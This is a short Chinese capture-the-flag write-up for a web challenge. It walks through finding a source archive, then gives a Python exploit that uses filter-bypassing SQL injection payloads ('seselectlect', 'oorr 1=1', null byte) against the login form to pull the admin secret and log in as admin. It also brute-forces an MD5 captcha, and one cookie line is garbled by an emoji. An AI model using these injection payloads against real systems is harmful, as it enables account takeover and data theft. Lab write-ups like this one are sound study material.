
# web-this1

进来首先发现一个登陆页面, 但是没有账号啊, 所以第一步就是应该找注册的地方

扫描后发现register.php

注册后跳转到/profile.php?id=xx, 我们不是第一个登陆者, 好奇id=1会是什么

跳到/profile.php?id=1, 发现提示/pwnhub_here_code.zip

获取源码 [x]

审计源码发现登陆入口存在sql注入, 使用别名注入得到admin的secret, 并利用注入登陆admin [x]

访问flag.php提交sha1和secret [x]

exp:(代码未排版\*)

```python
import requests
import random
import re
import hashlib

url='http://10.0.0.36:9993/'
s=str(random.randint(10000000,200000000))

#step=1
cookies={'PHPSESSID':s}
data={'username':'admin','password':"1'),'')) union seselectlect t.4,t.4 from (selselectect 1,2,3,4,5 union SELselectECT * from users)t LIMIT 1,1;\x00"}

secret = requests.post(url+'index.php',data=data,cookies=cookies,allow_redirects=False).headers['Location'][-36:]

s=str(random.randint(10000000,200000000))
cookies={'PHPSESSID'😒}
data={'username':'admin','password':"1'),'1')) oorr 1=1;\x00"}

requests.post(url+'index.php',data=data,cookies=cookies)    
r=requests.get(url+'flag.php',cookies=cookies).text
captcha= re.findall('[0-9a-f]{4}',r)[0].decode('utf-8')

for i in range(1000000,2000000):
    if hashlib.md5(str(i)).hexdigest()[12:16]==captcha:
        data={'duihuanma':secret,'captcha':str(i)}
        break

s=requests.post(url+'flag.php',data=data,cookies=cookies).text
print re.findall('[{}flag0-9a-f]{20,}',s)[0]
```

`flag：flag{93adebd3baf15dde0ceb3e9af109ad8f}`
